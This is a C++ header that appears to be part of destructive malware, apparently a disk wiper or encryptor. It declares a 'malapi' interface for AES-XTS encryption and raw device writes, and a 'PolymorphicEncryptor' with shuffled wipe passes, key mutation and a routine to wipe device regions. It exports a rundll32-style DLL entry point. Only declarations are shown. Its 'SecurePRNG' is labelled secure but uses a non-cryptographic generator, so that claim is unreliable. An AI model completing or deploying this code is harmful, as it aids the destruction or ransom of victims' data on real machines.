#pragma once
#ifndef NSFW_H
#define NSFW_H

#include <cstdint>
#include <vector>
#include <random>
#include <windows.h>

// Forward declare malapi and related dependencies if not included elsewhere
namespace malapi {
    namespace crypto {
        int aes_xts_encrypt(void* hook, uint8_t* buf, int size, uint64_t offset, const uint8_t* key, const uint8_t* iv);
    }
    namespace io {
        int write(void* hook, uint8_t* buf, int size, uint64_t offset);
    }
    void* mm_pool_alloc(size_t size);
    void mm_pool_free(void* ptr);
}

// Secure PRNG context
struct SecurePRNG {
    std::random_device rd;
    std::mt19937_64 gen;
    SecurePRNG() : gen(rd()) {}
    uint64_t random64() { return gen(); }
    void random_bytes(uint8_t* buf, size_t len) {
        for (size_t i = 0; i < len; ++i) buf[i] = static_cast<uint8_t>(gen() & 0xFF);
    }
};

// Polymorphic encryptor context
using WipePassFunc = int (*)(void* hook, uint8_t* buffer, int size, uint64_t offset, const uint8_t* key, const uint8_t* iv);

struct PolymorphicEncryptor {
    void* hook;
    int block_size;
    uint8_t* buffer;

    uint8_t key[32];
    uint8_t iv[16];
    SecurePRNG prng;

    std::vector<WipePassFunc> pass_functions;
    std::vector<uint8_t> pass_order;

    PolymorphicEncryptor();
    int initialize(void* dev_hook, int size);
    void cleanup();
    void build_pass_functions();
    void shuffle_pass_order();
    int wipe_block(uint64_t offset);
    void mutate_key_iv();
    int wipe_device_region(uint64_t start_offset, uint64_t length);
};

// Extern global instance
extern PolymorphicEncryptor g_encryptor;

// Exported entry point
extern "C" __declspec(dllexport) void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);

#endif // NSFW_H
